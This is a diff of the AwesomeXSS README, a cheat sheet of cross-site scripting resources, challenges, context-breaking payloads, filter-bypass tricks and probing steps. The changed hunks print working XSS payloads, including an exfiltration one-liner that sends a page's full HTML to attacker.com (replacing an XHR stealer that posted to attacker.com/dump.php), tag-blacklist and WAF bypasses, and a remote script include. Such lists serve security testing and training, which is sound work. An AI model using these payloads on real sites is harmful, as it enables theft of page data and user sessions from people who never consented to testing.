@@ -1,17 +1,41 @@
 # AwesomeXSS
-Awesome XSS stuff.
-Put this repo on watch. I will be updating it regularly.
+This repository is a collection of Awesome XSS resources. Contributions are welcome and should be submitted via an issue.
+
+### Awesome contents
+- [Challenges](https://github.com/s0md3v/AwesomeXSS#awesome-challenges)
+- [Reads & Presentations](https://github.com/s0md3v/AwesomeXSS#awesome-reads--presentations)
+- [Tools](https://github.com/s0md3v/AwesomeXSS#awesome-tools)
+- [Mind maps](https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps)
+- [DOM XSS](https://github.com/s0md3v/AwesomeXSS#awesome-dom-xss)
+- [Payloads](https://github.com/s0md3v/AwesomeXSS#awesome-payloads)
+- [Polyglots](https://github.com/s0md3v/AwesomeXSS#awesome-polyglots)
+- [Tags and event handlers](https://github.com/s0md3v/AwesomeXSS#awesome-tags--event-handlers)
+- [Context breaking](https://github.com/s0md3v/AwesomeXSS#awesome-context-breaking)
+    - [HTML context](https://github.com/s0md3v/AwesomeXSS#html-context)
+    - [Attribute context](https://github.com/s0md3v/AwesomeXSS#attribute-context)
+    - [JavaScript context](https://github.com/s0md3v/AwesomeXSS#javascript-context)
+- [Confirm Variants](https://github.com/s0md3v/AwesomeXSS#awesome-confirm-variants)
+- [Exploits](https://github.com/s0md3v/AwesomeXSS#awesome-exploits)
+- [Probing](https://github.com/s0md3v/AwesomeXSS#awesome-probing)
+- [Bypassing](https://github.com/s0md3v/AwesomeXSS#awesome-bypassing)
+- [Encoding](https://github.com/s0md3v/AwesomeXSS#awesome-encoding)
+- [Tips & tricks](https://github.com/s0md3v/AwesomeXSS#awesome-tips--tricks)
 
 ### Awesome Challenges
-- [Google's XSS Challenge](https://xss-game.appspot.com/)
-- [prompt(1) to win](http://prompt.ml/)
-
-### Awesome People
-- [Somdev Sangwan](https://twitter.com/s0md3v) because I made this repo :3
+- [prompt.ml](https://prompt.ml)
+- [alf.nu/alert1](https://alf.nu/alert1)
+- [s-p-o-o-k-y.com](https://www.s-p-o-o-k-y.com)
+- [xss-game.appspot.com](https://xss-game.appspot.com)
+- [polyglot.innerht.ml](https://polyglot.innerht.ml)
+- [sudo.co.il/xss](http://sudo.co.il/xss)
+- [hack.me/t/XSS](https://hack.me/t/XSS)
+- [root-me.org](https://www.root-me.org/?page=recherche&lang=en&recherche=xss)
+- [chefsecure.com](https://chefsecure.com/courses/xss/challenges)
+- [wechall.net](https://www.wechall.net/challs/XSS)
 
 ### Awesome Reads & Presentations
+- [Bypassing XSS Detection Mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
 - [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)
-- [Bypass Any WAF for XSS](https://teamultimate.in/bypass-waf-xss-easily/)
 - [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
 - [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
 - [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)
@@ -25,7 +49,7 @@ Put this repo on watch. I will be updating it regularly.
 - [JShell](https://github.com/UltimateHackers/JShell)
 
 ### Awesome XSS Mind Maps
-A beutiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)
+A beautiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)
 
 ### Awesome DOM XSS
 
@@ -161,7 +185,7 @@ Case: `<tag attribute="$input">`
 "><svg onload=alert()><b attr="
 " onmouseover=alert() "
 "onmouseover=alert()//
-"autocous/onfocus="alert()
+"autofocus/onfocus="alert()
 ```
 #### JavaScript Context
 
@@ -180,6 +204,9 @@ Yep, confirm because alert is too mainstream.
 ```
 confirm()
 confirm``
+(confirm``)
+{confirm``}
+[confirm``]
 (((confirm)))``
 co\u006efirm()
 new class extends confirm``{}
@@ -199,24 +226,15 @@ Array.from(document.getElementsByTagName("a")).forEach(function(i) {
 });
 ```
 ##### Source Code Stealer
-```javascript
-var request = new XMLHttpRequest();
-request.open("GET", url, true);
-request.send();
-request.onreadystatechange = function() {
-    if (request.readyState == 4)
-	      response = request.responseText;
-	      var dump = new XMLHttpRequest();
-	      dump.open("POST", "attacker.com/dump.php", true)
-	      dump.send(response);
-}
+```html
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
 ```
 A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
 ### Awesome Probing
 If nothing of this works, take a look at **Awesome Bypassing** section
 
-First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of refelections.
+First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of reflections.
 <br>Now for attribute context, check if double quotes (") are being filtered by entering `x"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>
 If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
 <br>For javascript context, check which quotes are being used for example if they are doing
@@ -231,7 +249,7 @@ But if it gets altered to `x\\\\'d3v`, the only thing you can try is closing the
 ```
 </script><svg onload=alert()>
 ```
-For simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potenial filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using
+For simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potential filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using
 ```
 <svg onload=alert()//
 ```
@@ -287,7 +305,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 <x ondrag=aconfirm()>drag it
 ```
 
-- Bypass tag blackilisting
+- Bypass tag blacklisting
 ```
 </ScRipT>
 </script
@@ -336,7 +354,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 - alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
 - You can use `//` to close a tag instead of `>`.
 - I have found that `confirm` is the least detected pop-up function so stop using `alert`.
-- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
+- Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
 - The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)
 
 ### Awesome Credits
